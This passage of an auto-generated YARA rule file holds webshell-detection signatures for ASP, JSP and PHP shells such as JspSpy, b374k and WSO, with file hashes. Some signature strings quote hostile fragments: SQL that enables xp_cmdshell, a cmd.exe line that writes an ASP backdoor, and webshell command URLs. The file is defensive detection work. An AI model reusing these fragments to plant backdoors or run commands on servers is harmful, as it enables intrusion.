      ( ( uint16(0) == 0xbbef or uint16(0) == 0x253c ) and filesize < 400KB and ( all of them )
      ) or ( all of them )
}

rule _view_2013110125222650_con2_362 {
   meta:
      description = "webshell - from files view.aspx, 2013110125222650.aspx, con2.aspx"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "5bf7f8e8b37b9377b542916b690e7c700cc2035485a6c09cfefc682e951606d3"
      hash2 = "bbee3a7eeceef058919740e7317cd8f552b194badf3cdc6922e42b115fdd7fa9"
      hash3 = "d175b3176f1fb891735a2aaed2bc851074b3b50d4eb99c90146dc6a0eaa26d48"
   strings:
      $s1 = "<form id=\"Form3\" runat=\"server\">" fullword ascii
      $s2 = "<form id=\"Form8\" runat=\"server\">" fullword ascii
      $s3 = "<form id=\"Form11\" runat=\"server\">" fullword ascii
      $s4 = "<form id=\"Form7\" runat=\"server\">" fullword ascii
      $s5 = "<form id=\"Form4\" runat=\"server\">" fullword ascii
      $s6 = "<form id=\"Form6\" runat=\"server\">" fullword ascii
      $s7 = "<form id=\"Form9\" runat=\"server\">" fullword ascii
      $s8 = "<form id=\"Form5\" runat=\"server\">" fullword ascii
      $s9 = "<form id=\"Form2\" runat=\"server\">" fullword ascii
   condition:
      ( ( uint16(0) == 0x253c or uint16(0) == 0x6967 ) and filesize < 200KB and ( all of them )
      ) or ( all of them )
}

rule _11_aspx_363 {
   meta:
      description = "webshell - from files 11.aspx, aspx.aspx"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "f09b8567e0aa79ab9b223019b3f67cf98fe7dd2ffcab881e1421adf6f9e4c5b0"
      hash2 = "51d564b700c985fd7aba31ed6a0b8f7b7ddaa7a2adcdaf8d649adb2641ade061"
   strings:
      $x1 = "        string select = \"<input type=hidden name=goaction><input type=hidden name=todo><input type=hidden name=intext><select o" ascii
      $x2 = " @s,'run',NULL,'cmd.exe /c echo ^&lt;%execute(request(char(35)))%^> > c:\\\\1.asp';\\\">SP_oamethod exec<option value=\\\"sp_mak" ascii
      $x3 = "sk @outputfile='d:\\\\web\\\\bin.asp',@charset=gb2312,@query='select ''<%execute(request(chr(35)))\" + \"%\" + \">''' \\\">SP_ma" ascii
      $s4 = "p_cmdshell 'net user'\\\">XP_cmdshell exec<option value=\\\"Declare @s  int;exec sp_oacreate 'wscript.shell',@s out;Exec SP_OAMe" ascii
      $s5 = "FIGURE;exec sp_configure 'Ad Hoc Distributed Queries',1;RECONFIGURE;\\\">Open Openrowset(SQL2005)<option value=\\\"Exec master.d" ascii
      $s6 = "xp_cmdshell<option value=\\\"EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFI" ascii
      $s7 = "RE;\\\">Add xp_cmdshell(SQL2005)<option value=\\\"exec sp_configure 'show advanced options', 1;RECONFIGURE;exec sp_configure 'Ol" ascii
      $s8 = "tomation Procedures',1;RECONFIGURE;\\\">Add sp_oacreate(SQL2005)<option value=\\\"exec sp_configure 'show advanced options', 1;R" ascii
      $s9 = "make file\";" fullword ascii
   condition:
      ( ( uint16(0) == 0x253c or uint16(0) == 0xbbef ) and filesize < 200KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _c5_403_queryDong_myxx1_config_000_t00ls1_zend_t00ls_spyjsp2010_SJavaWebManageV1_4_364 {
   meta:
      description = "webshell - from files c5.jsp, 403.jsp, queryDong.jsp, myxx1.jsp, config.jsp, 000.jsp, t00ls1.jsp, zend.jsp, t00ls.jsp, spyjsp2010.jsp, SJavaWebManageV1.4.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "64fbd3a67c6d02626cf130946a3bc5e8113a65ea66176006582a380b12d495d9"
      hash2 = "9e510dffd01cef28047043c0331f408279042cf724c8d2a76968e5eb40446caa"
      hash3 = "9b3677edc3dc6cf868b8c62166ed9db5062891501b3776876ea95a7e8884db72"
      hash4 = "a5b67b8b8617fd8f2cff76399aa8782813bb29f06c9b6b444db8617a65a0771c"
      hash5 = "5deda28b47b16d083c40e0fecdf617de7e645a7b06a053a572c6e2702dc8577b"
      hash6 = "2424ea073fb98b85c26b9fd47bc8cfe5008504fd7ab80de428b75c296f3dd114"
      hash7 = "9347f147b944e67d33818aa1a5fa10476ef333acb838e80fffb2db2da71c9368"
      hash8 = "e26e617b9e9b77f4578f8737e3463c18210855626b4aca49d465be65f59e97d1"
      hash9 = "bb809d10d8dc0be89123e35d659513fb49faed3aea32c1facfcc9d21ad39f422"
      hash10 = "410bf542ec9d693517486e33e7f45955d2a06f77f195e847c74ac3dcacf6a677"
      hash11 = "ecf43efae44a4fb4078bc7da76e07cc10fe4e92fc145b58d7999f0cc2b902cde"
   strings:
      $s1 = "//download." fullword ascii
      $s2 = "ResultSet dbs = meta.getCatalogs();" fullword ascii
      $s3 = "byte[] rowSep = \"\\r\\n\".getBytes();" fullword ascii
      $s4 = "v = rs.getString(i);" fullword ascii
      $s5 = "dbs.close();" fullword ascii
      $s6 = "return this.conn;" fullword ascii
      $s7 = "String v = null;" fullword ascii
      $s8 = "if (o instanceof ResultSet) {" fullword ascii
      $s9 = "v += \"\\t\";" fullword ascii
   condition:
      ( ( uint16(0) == 0x253c or uint16(0) == 0xbbef ) and filesize < 400KB and ( all of them )
      ) or ( all of them )
}

rule _c5_403_queryDong_myxx1_config_000_zend_spyjsp2010_365 {
   meta:
      description = "webshell - from files c5.jsp, 403.jsp, queryDong.jsp, myxx1.jsp, config.jsp, 000.jsp, zend.jsp, spyjsp2010.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "64fbd3a67c6d02626cf130946a3bc5e8113a65ea66176006582a380b12d495d9"
      hash2 = "9e510dffd01cef28047043c0331f408279042cf724c8d2a76968e5eb40446caa"
      hash3 = "9b3677edc3dc6cf868b8c62166ed9db5062891501b3776876ea95a7e8884db72"
      hash4 = "a5b67b8b8617fd8f2cff76399aa8782813bb29f06c9b6b444db8617a65a0771c"
      hash5 = "5deda28b47b16d083c40e0fecdf617de7e645a7b06a053a572c6e2702dc8577b"
      hash6 = "2424ea073fb98b85c26b9fd47bc8cfe5008504fd7ab80de428b75c296f3dd114"
      hash7 = "e26e617b9e9b77f4578f8737e3463c18210855626b4aca49d465be65f59e97d1"
      hash8 = "410bf542ec9d693517486e33e7f45955d2a06f77f195e847c74ac3dcacf6a677"
   strings:
      $s1 = "if (tempF.isDirectory()) {" fullword ascii
      $s2 = "File tempF = new File(savePath);" fullword ascii
      $s3 = "File saveF = tempF;" fullword ascii
      $s4 = "String encode = request.getParameter(\"encode\");" fullword ascii
      $s5 = "//zip root directory" fullword ascii
      $s6 = "if (f.exists() && f.length() > 0)" fullword ascii
      $s7 = "return new Double(format.format(value)).doubleValue();" fullword ascii
      $s8 = "if (Util.isEmpty(encode))" fullword ascii
      $s9 = "if (currentDir.equals(\"\")) {" fullword ascii
   condition:
      ( ( uint16(0) == 0x253c or uint16(0) == 0xbbef ) and filesize < 400KB and ( all of them )
      ) or ( all of them )
}

rule _Browser_download_ma2_ma_jsp_File_browser_3_366 {
   meta:
      description = "webshell - from files Browser.jsp, download.jsp, ma2.jsp, ma.jsp, jsp_File_browser.jsp, 3.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "5c8e4945b0aa4bc661db0f9fea51a7fac07ad3d4093c499100570a613906512c"
      hash2 = "b5e9cd17caf4344895afca031a55535af49189c60a4b05095425931c9ab1b11b"
      hash3 = "09b677ca8806f681cb31ad69b8ec79b3416b491a04b8283d606ac7ba7edffeda"
      hash4 = "62c616f5cddfd493f16e6ef2d7fe12567ee2d16a311317da8d59fb5f3f09f713"
      hash5 = "89a69d8d77e3a427276a568cde58dbfa0fd8a555f51ecc38c1b91a929db2b209"
      hash6 = "e44e97f8d375523576bb2e93e3de8d29d7f95891da3d082bf083b837d1873eab"
   strings:
      $s1 = "request.setAttribute(\"dir\", request.getParameter(\"dir\"));" fullword ascii
      $s2 = "private static String tempdir = \".\";" fullword ascii
      $s3 = "<input type=\"hidden\" name=\"dir\" value=\"<%=request.getAttribute(\"dir\")%>\">" fullword ascii
      $s4 = "private static final int EDITFIELD_ROWS = 30;" fullword ascii
      $s5 = "var check = false;" fullword ascii /* Goodware String - occured 1 times */
      $s6 = "%></textarea>" fullword ascii
      $s7 = "function selrow (element, i){" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 200KB and ( all of them )
      ) or ( all of them )
}

rule _403_queryDong_000_spyjsp2010_367 {
   meta:
      description = "webshell - from files 403.jsp, queryDong.jsp, 000.jsp, spyjsp2010.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "9e510dffd01cef28047043c0331f408279042cf724c8d2a76968e5eb40446caa"
      hash2 = "9b3677edc3dc6cf868b8c62166ed9db5062891501b3776876ea95a7e8884db72"
      hash3 = "2424ea073fb98b85c26b9fd47bc8cfe5008504fd7ab80de428b75c296f3dd114"
      hash4 = "410bf542ec9d693517486e33e7f45955d2a06f77f195e847c74ac3dcacf6a677"
   strings:
      $x1 = "<td><span style=\\\"float:right;\\\"><a href=\\\"http://www.forjj.com\\\" target=\\\"_blank\\\">JspSpy Ver: 2010 </a></span>\"+r" ascii
      $x2 = "\"<!--<span style=\\\"font:11px Verdana;\\\">Copyright &copy; 2010 NinTy </span><a href=\\\"http://www.forjj.com\\\" target=\\\"" ascii
      $x3 = "<td><span style=\\\"float:right;\\\"><a href=\\\"http://www.forjj.com\\\" target=\\\"_blank\\\">JspSpy Ver: 2010 </a></span>\"+r" ascii
      $s4 = "response.getWriter().println(\"<div style=\\\"padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#ee" ascii
      $s5 = "\"<!--<span style=\\\"font:11px Verdana;\\\">Copyright &copy; 2010 NinTy </span><a href=\\\"http://www.forjj.com\\\" target=\\\"" ascii
      $s6 = "\">Copyright (C) 2010 <a href=\\\"http://www.forjj.com\\\" target=\\\"_blank\\\">http://www.Forjj.com/</a>&nbsp;&nbsp;<a target=" ascii
      $s7 = "der(\"host\")+\" (<span id='ip'>\"+InetAddress.getLocalHost().getHostAddress()+\"</span>) | <a href=\\\"javascript:if (!window.c" ascii
      $s8 = "dData){alert('only support IE!');}else{void(window.clipboardData.setData('Text', document.getElementById('ip').innerText));alert" ascii
      $s9 = "('ok')}\\\">copy</a></td>\"+" fullword ascii
   condition:
      ( ( uint16(0) == 0x253c or uint16(0) == 0xbbef ) and filesize < 400KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _jspspy_k8_jspspy_368 {
   meta:
      description = "webshell - from files jspspy_k8.jsp, jspspy.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "9ce81cfc056822ec9962aa8d6ca2233ac56e26a10f96cddc117d89b73a14c060"
      hash2 = "09662e5f79e84781ecb6b508794e52a578726229cc2e37be676cfba5e8751d1a"
   strings:
      $x1 = "<td><span style=\\\"float:right;\\\"><a href=\\\"http://www.baidu.com\\\" target=\\\"_blank\\\">JspSpy Ver: 2009</a></span>\"+re" ascii
      $x2 = "<td><span style=\\\"float:right;\\\"><a href=\\\"http://www.baidu.com\\\" target=\\\"_blank\\\">JspSpy Ver: 2009</a></span>\"+re" ascii
      $s3 = "response.getWriter().println(\"<div style=\\\"padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#ee" ascii
      $s4 = "\">Copyright (C) 2009 <a href=\\\"http://www.baidu.com\\\" target=\\\"_blank\\\">http://www.baidu.com/</a>&nbsp;&nbsp;<a target=" ascii
      $s5 = "\"<span style=\\\"font:11px Verdana;\\\">Copyright &copy; 2012 Admin </span><a href=\\\"http://www.baidu.com\\\" target=\\\"_bla" ascii
      $s6 = "\"<span style=\\\"font:11px Verdana;\\\">Copyright &copy; 2012 Admin </span><a href=\\\"http://www.baidu.com\\\" target=\\\"_bla" ascii
      $s7 = "\" href=\\\"http://www.baidu.com/\\\">[T00ls.Net]</a> All Rights Reserved.\"+" fullword ascii
      $s8 = "idu.com</a></p>\"+" fullword ascii
      $s9 = "<%@page pageEncoding=\"UTF-8\"%>" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 200KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _asp___1__4_0_2013110125027897_asp__1___2014_10_23_14_54_16__2014_asp_369 {
   meta:
      description = "webshell - from files asp.asp,  (1).asp, 4.0.asp, 2013110125027897.asp, asp (1)__2014-10-23-14-54-16.asp, _2014.asp, asp (1).asp, 2014.asp, 4.0 (1).asp, UnKnown Vip (1).asp, asp (1).asp, .asp, asp.asp, UnKnown Vip.asp, asp (1)__2014-10-23-14-54-16.asp, .asp, 2013.asp, _2012.asp, .asp, vps.asp,  (1).asp,  (1)__2014-10-23-14-54-16.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3e33f195e7c39b1b03d01f57278a2a6f0155bd5faaeaf2dc97e4159513115b5f"
      hash2 = "087dac16734d0c4d23d08080d6f8e031ed6eb19659a532827326671947d636f2"
      hash3 = "291f142cf50354c5f224c02823c6f752fe9b73ea120829c357cda51719efbf80"
      hash4 = "aa77ff5d79dbbe7fb143ff3609814d84d72d4d057188954bfdf72f282733b5b8"
      hash5 = "c4a1256a20bd05705365d4f53e7e968c7270ad54d429826d46307dd0bf47b0be"
      hash6 = "dbe7c6efd138b10ccbec38547eea33e8fefd21f9210378107c268d02f844ef5e"
      hash7 = "afa4d004314ff296712e8d2c7d7707cc66b7c42bc4ba7beb3e4faf585a255894"
      hash8 = "028bc60e3c833563e1b96911bd9357d0015c765524fbbfca29afe33257dd48e7"
      hash9 = "bd4aea1c2f8cbf4910acc7ae124482299e64b6fed9bf41bbc8e7e7441b195528"
      hash10 = "c7530b4c6126a53e2036f0f0f1d05cebc960909a0471e01569ff6fd735572b29"
      hash11 = "fe68b71a08164d265887dc54dc95efde789d70eb77b318ca289a3b5998c90aca"
      hash12 = "187f477b13e2124e9c252dcb4d385407eee5aadcc466467ce959d388aaff2e0d"
      hash13 = "2134e5fad0d686a633c95fdbdf95cfd4cd316eb2c4ee136ef7e05c20a6059847"
      hash14 = "57ccf2912b792e21f63ecb9c4308a4276a3291c7f5fdf1e74063bcc9e250316e"
      hash15 = "d0cb05a853e883fce03015ac39b9e8c10adb902681bf320eedcd89dd27747d84"
      hash16 = "1be24d938840d2778c29c4394a869b7ff8b11e57b5fd6340ca5fd2488b42a5fc"
      hash17 = "8d7e8a0c10ac15a65f119551a616520dd7be2c35a7fdc51000c66f63abc92fee"
      hash18 = "608a7c994916084ff0f91b3dbe31a52763eab03ee2dd35dbc14592cc7bf7a096"
      hash19 = "61cd9e83ae25b8cee03369fe32a4a82ad54829e9d89b8db5267fb1d87d209da6"
      hash20 = "a5728d9bfa3233f4c79b0551dc79dff0182392beadbb4cdfc823d4a8c68187f9"
      hash21 = "c4f1ef150f666537d2a6f97f432419c38c63fc3818b1b97ee5dca3ff804e2ff8"
      hash22 = "f107bfb0bca4900116cad341733919b6138a82c2b2f269da17361703ae57a337"
   strings:
      $s1 = "a.open \"GET\", \"http://127.0.0.1:\" & port & \"/goldsun/upadmin/s1\",True, \"\", \"\"" fullword ascii
      $s2 = "b.open \"GET\", \"http://127.0.0.1:\" & ftpport & \"/goldsun/upadmin/s2\", True, \"\", \"\"" fullword ascii
      $s3 = "a.send loginuser & loginpass & mt & deldomain & newdomain & newuser & quit" fullword ascii
      $s4 = "b.send \"User go\" & vbCrLf & \"pass od\" & vbCrLf & \"site exec \" & cmd & vbCrLf & quit" fullword ascii
      $s5 = "set a=Server.CreateObject(\"Microsoft.XMLHTTP\")" fullword ascii
      $s6 = "set c=Server.CreateObject(\"Microsoft.XMLHTTP\")" fullword ascii
      $s7 = "set b=Server.CreateObject(\"Microsoft.XMLHTTP\")" fullword ascii
      $s8 = "\"&pass&\"...<center>');\"" fullword ascii
   condition:
      ( ( uint16(0) == 0x253c or uint16(0) == 0x6f3c ) and filesize < 400KB and ( all of them )
      ) or ( all of them )
}

rule _asp_asp__1___2014_10_23_14_54_16_UnKnown_Vip__1__asp__1__UnKnown_Vip_vps_370 {
   meta:
      description = "webshell - from files asp.asp, asp (1)__2014-10-23-14-54-16.asp, UnKnown Vip (1).asp, asp (1).asp, UnKnown Vip.asp, vps.asp, r00tsFSO.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3e33f195e7c39b1b03d01f57278a2a6f0155bd5faaeaf2dc97e4159513115b5f"
      hash2 = "c4a1256a20bd05705365d4f53e7e968c7270ad54d429826d46307dd0bf47b0be"
      hash3 = "c7530b4c6126a53e2036f0f0f1d05cebc960909a0471e01569ff6fd735572b29"
      hash4 = "fe68b71a08164d265887dc54dc95efde789d70eb77b318ca289a3b5998c90aca"
      hash5 = "57ccf2912b792e21f63ecb9c4308a4276a3291c7f5fdf1e74063bcc9e250316e"
      hash6 = "a5728d9bfa3233f4c79b0551dc79dff0182392beadbb4cdfc823d4a8c68187f9"
      hash7 = "9f8fe38a42a615aa843f20a33ab83d433dd92eba7747a2c19567de0421405543"
   strings:
      $s1 = ":<input name='tpath' type='text' class='TextBox' id='tpath' value='C:\\'><br>\"" fullword ascii
      $s2 = ":<input name='duser' type='text' class='TextBox' id='duser' value='LocalAdministrator'><br>\"" fullword ascii
      $s3 = " onclick=\"\"window.close();\"\">\"" fullword ascii
      $s4 = "'></p></form>\"" fullword ascii
      $s5 = ":<input name='tport' type='text' class='TextBox' id='tport' value='21'><br>\"" fullword ascii
      $s6 = ":<input name='dport' type='text' class='TextBox' id='dport' value='43958'><br>\"" fullword ascii
      $s7 = "</TD>\"" fullword ascii
      $s8 = "</TR>\"" fullword ascii
      $s9 = " :<input name='dpwd' type='text' class='TextBox' id='dpwd' value='#l@$ak#.lk;0@P'><br>\"" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 400KB and ( all of them )
      ) or ( all of them )
}

rule _4_0_2013110125027897__2014_4_0__1___2012_r00tsFSO_371 {
   meta:
      description = "webshell - from files 4.0.asp, 2013110125027897.asp, _2014.asp, 4.0 (1).asp, _2012.asp, r00tsFSO.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "291f142cf50354c5f224c02823c6f752fe9b73ea120829c357cda51719efbf80"
      hash2 = "aa77ff5d79dbbe7fb143ff3609814d84d72d4d057188954bfdf72f282733b5b8"
      hash3 = "dbe7c6efd138b10ccbec38547eea33e8fefd21f9210378107c268d02f844ef5e"
      hash4 = "bd4aea1c2f8cbf4910acc7ae124482299e64b6fed9bf41bbc8e7e7441b195528"
      hash5 = "608a7c994916084ff0f91b3dbe31a52763eab03ee2dd35dbc14592cc7bf7a096"
      hash6 = "9f8fe38a42a615aa843f20a33ab83d433dd92eba7747a2c19567de0421405543"
   strings:
      $s1 = "getHTTPPage=\"\"" fullword ascii
      $s2 = "getHTTPPage=bytes2BSTR(Http.responseBody) " fullword ascii
      $s3 = "if Http.readystate<>4 then" fullword ascii
      $s4 = "Http.send() " fullword ascii
      $s5 = "set http=nothing" fullword ascii
      $s6 = "set http=Server.createobject(\"Microsoft.XMLHTTP\") " fullword ascii
      $s7 = "dim http " fullword ascii
      $s8 = " Private Function CreatePattern(keyword)   " fullword ascii
      $s9 = "if err.number<>0 then err.Clear  " fullword ascii
   condition:
      ( ( uint16(0) == 0x253c or uint16(0) == 0x6f3c ) and filesize < 300KB and ( all of them )
      ) or ( all of them )
}

rule _2013110125027897_NEW_WebShell__1__NEW_WebShell__1___2014_10_23_14_54_16__NEW_WebShell___1__r00tsFSO_372 {
   meta:
      description = "webshell - from files 2013110125027897.asp, NEW WebShell (1).asp, NEW WebShell (1)__2014-10-23-14-54-16.asp, .asp, NEW WebShell.asp,  (1).asp, r00tsFSO.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "aa77ff5d79dbbe7fb143ff3609814d84d72d4d057188954bfdf72f282733b5b8"
      hash2 = "1cc6359207f91e48f9834698e71893682668f7d9d47cfabbfb2c8a8bbd1e29e0"
      hash3 = "2e0c6dff1b01fd4a729201ee20cfb3e3db95aba65427afaf168efda3673f3750"
      hash4 = "61cd9e83ae25b8cee03369fe32a4a82ad54829e9d89b8db5267fb1d87d209da6"
      hash5 = "7080a9113a1bfccb5edc725746f0ed8cf44e09b67a78bcfc6ed2413f696e528e"
      hash6 = "c4f1ef150f666537d2a6f97f432419c38c63fc3818b1b97ee5dca3ff804e2ff8"
      hash7 = "9f8fe38a42a615aa843f20a33ab83d433dd92eba7747a2c19567de0421405543"
   strings:
      $s1 = "fso.copyfile fpath,\"\\\\.\\\"&filepath1&\"\\\"&rndpex&\".\"&filename1" fullword ascii
      $s2 = "session(\"seljw\")=\"\"" fullword ascii
      $s3 = "set fso=nothing" fullword ascii
      $s4 = "filepath1=server.mappath(\".\")" fullword ascii
      $s5 = "url=left(url,instrrev(url,\"/\"))&rndpex&\".\"&filename1" fullword ascii
      $s6 = "url=request.servervariables(\"url\")" fullword ascii
      $s7 = "filename1=right(fpath,len(fpath)-instrrev(fpath,\"\\\"))" fullword ascii
      $s8 = "rndpex=split(pex,\"|\")(rndnumber(0,17))" fullword ascii
      $s9 = "pex=\"com1|com2|com3|com4|com5|com6|com7|com8|com9|lpt1|lpt2|lpt3|lpt4|lpt5|lpt6|lpt7|lpt8|lpt9\"" fullword ascii
   condition:
      ( ( uint16(0) == 0x6f3c or uint16(0) == 0x253c ) and filesize < 300KB and ( all of them )
      ) or ( all of them )
}

rule _shell_decoded_zehir4_zehir_373 {
   meta:
      description = "webshell - from files shell_decoded.asp, zehir4.asp, zehir.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "d3bc4102bba36224ad94e0f8a23cc31f8a9278f5fc1797693329204ef0b15e6b"
      hash2 = "cb9d5427a83a0fc887e49f07f20849985bd2c3850f272ae1e059a08ac411ff66"
      hash3 = "c350b163b5527ee445b315ec5a2431e311201616ce8cb2f7d048888ef58da2c4"
   strings:
      $s1 = "  ReadBinaryFile = BinaryStream.Read" fullword ascii
      $s2 = "  Const adTypeBinary = 1" fullword ascii
      $s3 = "  BinaryStream.Open" fullword ascii
      $s4 = "  Dim BinaryStream" fullword ascii
      $s5 = "  BinaryStream.Type = adTypeBinary" fullword ascii
      $s6 = "  BinaryStream.LoadFromFile FileName" fullword ascii
      $s7 = "Response.Write \"</td></tr></table></form>\"" fullword ascii
      $s8 = "  Set BinaryStream = CreateObject(\"ADODB.Stream\")" fullword ascii
      $s9 = "END SELECT" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 400KB and ( all of them )
      ) or ( all of them )
}

rule _angel_shell_2008_phpspy_2006_2009lite_spy_lnc_2011_2009mssql_374 {
   meta:
      description = "webshell - from files angel.php, shell.php, 2008.php, phpspy_2006.php, 2009lite.php, spy.php, lnc.php, 2011.php, 2009mssql.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "61f8635790fa5873c4fbcf873e9e8ff18ce3ed0a5a68f464401118adac3f969a"
      hash2 = "64e6c08aa0b542481b86a91cdf1f50c9e88104a8a4572a8c6bd312a9daeba60e"
      hash3 = "5c00d5b172f123e7eb9c0735b60fbaf48b22eec4c7560d9586d891d85e0b3db5"
      hash4 = "9269ad2472ecbabbc7b8e838312c71daa42eeadfd79c20f771107e848920c35e"
      hash5 = "61956e7a2fe44293ceaedc2e56ac52eee13064cd328fab1c5b314e5dc56012a6"
      hash6 = "e1c70ddcfbc56c7dff46ea03ed53aab3f022e53a6f8e98f12d8b8557cc6bfb4d"
      hash7 = "28e6e00c1851a30f0f847df7c21f371b41f815150011b1b2d7b8d5ef060a2900"
      hash8 = "8fcb2efc5be0f0ac3aa7ac7c40a16418f193daad04920977c415917617f9b936"
      hash9 = "77b769be4387a43095812683ce1759814aba6e12792a26e1cf0bb8b4156cd80d"
   strings:
      $s1 = "$stroutput = $stdout->ReadAll();" fullword ascii
      $s2 = "echo $stroutput;" fullword ascii
      $s3 = "tober'=>10,'November'=>11,'December'=>12);" fullword ascii
      $s4 = "function CheckAll(form) {" fullword ascii
      $s5 = "elseif ($doupfile) {" fullword ascii
      $s6 = "}// while" fullword ascii
      $s7 = "$cachemonth = array('January'=>1,'February'=>2,'March'=>3,'April'=>4,'May'=>5,'June'=>6,'July'=>7,'August'=>8,'September'=>9,'Oc" ascii
      $s8 = "$cachemonth = array('January'=>1,'February'=>2,'March'=>3,'April'=>4,'May'=>5,'June'=>6,'July'=>7,'August'=>8,'September'=>9,'Oc" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( all of them )
      ) or ( all of them )
}

rule _phpspy_2005_full_2008_icesword_silic_phpspy_2006_ghost_source_lnc_2009mssql_375 {
   meta:
      description = "webshell - from files phpspy_2005_full.php, 2008.php, icesword.php, silic.php, phpspy_2006.php, ghost_source.php, lnc.php, 2009mssql.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "c2b377ee1e465ed9acba15789b866d1a9a39b8880380367376332135e806a067"
      hash2 = "5c00d5b172f123e7eb9c0735b60fbaf48b22eec4c7560d9586d891d85e0b3db5"
      hash3 = "adf16adeffb5b05dda9e3588f06dba46fcd520c33f113ec0090cd4cda82b8b11"
      hash4 = "8f00d641fc0655d989b3c6abaf414266f1a2c877be5ada07b4265aa069729aca"
      hash5 = "9269ad2472ecbabbc7b8e838312c71daa42eeadfd79c20f771107e848920c35e"
      hash6 = "a423ef2bec4f1c75d49c6eeb2b6aa38128dae2afcf6e0e7ebfe196833ea43a78"
      hash7 = "28e6e00c1851a30f0f847df7c21f371b41f815150011b1b2d7b8d5ef060a2900"
      hash8 = "77b769be4387a43095812683ce1759814aba6e12792a26e1cf0bb8b4156cd80d"
   strings:
      $s1 = "$cdrec .= pack('V', $this -> old_offset );" fullword ascii
      $s2 = "$cdrec .= pack('v', 0 );" fullword ascii
      $s3 = "$fr .= pack('V', $unc_len);" fullword ascii /* Goodware String - occured 1 times */
      $s4 = "$cdrec .= pack('v', strlen($name) );" fullword ascii
      $s5 = "$cdrec .= pack('V', $crc);" fullword ascii /* Goodware String - occured 1 times */
      $s6 = "$cdrec .= \"\\x00\\x00\";" fullword ascii /* Goodware String - occured 1 times */
      $s7 = "$data    = implode('', $this -> datasec);" fullword ascii
      $s8 = "var $out='';" fullword ascii
   condition:
      ( ( uint16(0) == 0x3f3c or uint16(0) == 0x6540 ) and filesize < 500KB and ( all of them )
      ) or ( all of them )
}

rule _b374k_2_4_b374k_2_5_source_b374k_2_6_source_b374k_2_3_b374k_2_7_source_376 {
   meta:
      description = "webshell - from files b374k-2.4.php, b374k-2.5.source.php, b374k-2.6.source.php, b374k-2.3.php, b374k-2.7.source.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "13102785319ab7591a39c8a8bb40b01bf34e49a7f0a832a1f3dbaabf5f40e9dd"
      hash2 = "2fa1659755f6cf2f5a5db59a7836e77e0a069218557fa552b9230b5e4da56469"
      hash3 = "c14466232481a3aa9192507127f2ca43898228671e5e87a17ddd05383c758746"
      hash4 = "e6b1fbcc9a2d988ef9e8c36da38f19a802a5886a43736a1466566f97f342f946"
      hash5 = "d31034d5e4fd8d5d8efe640c4d2aa7ac43c71989f84fb4e92606a18563b3fd5e"
   strings:
      $s1 = "http://www.myserver.com/b374k.php?s_pass=0de664ecd2be02cdd54234a0d1229b43&cmd=dW5hbWUgLWE=" fullword ascii
      $s2 = "http://www.myserver.com/b374k.php?s_pass=0de664ecd2be02cdd54234a0d1229b43&eval=cGhwaW5mbygpOw==" fullword ascii
      $s3 = "// this example using password 'b374k' in md5 format (s_pass=0de664ecd2be02cdd54234a0d1229b43)" fullword ascii
      $s4 = "// you need to supply password (in md5 format) to access this" fullword ascii
      $s5 = "function download(what){" fullword ascii
      $s6 = "function get_archiver_available(){" fullword ascii
      $s7 = "function toggle(b){" fullword ascii
      $s8 = "// find available archiver" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 400KB and ( all of them )
      ) or ( all of them )
}

rule _wso_4_2_4_wso2_5_1_other_decode_wso_4_2_3_wso_4_2_0_wso_4_2_1_wso2_wso_4_2_5_wso_4_1_3__v_wso_4_2_2_wso_ng_377 {
   meta:
      description = "webshell - from files wso-4.2.4.php, wso2.5.1.php, other-decode.php, wso-4.2.3.php, wso-4.2.0.php, wso-4.2.1.php, wso2.php, wso-4.2.5.php, wso-4.1.3.php, .v.php, wso-4.2.2.php, wso-ng.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3c2811c345e88c17088339ac93c76ad49d31b337d12d6c76d024b00280cbee3a"
      hash2 = "e755ab961e03c18481ac884ddbc8cd665ddf36ccf106b4a82d89079fe18dbca5"
      hash3 = "5a3a5b2f5c081b894e410381415a7f2c821a55d7781b82c0d819cfe56ad1a9a8"
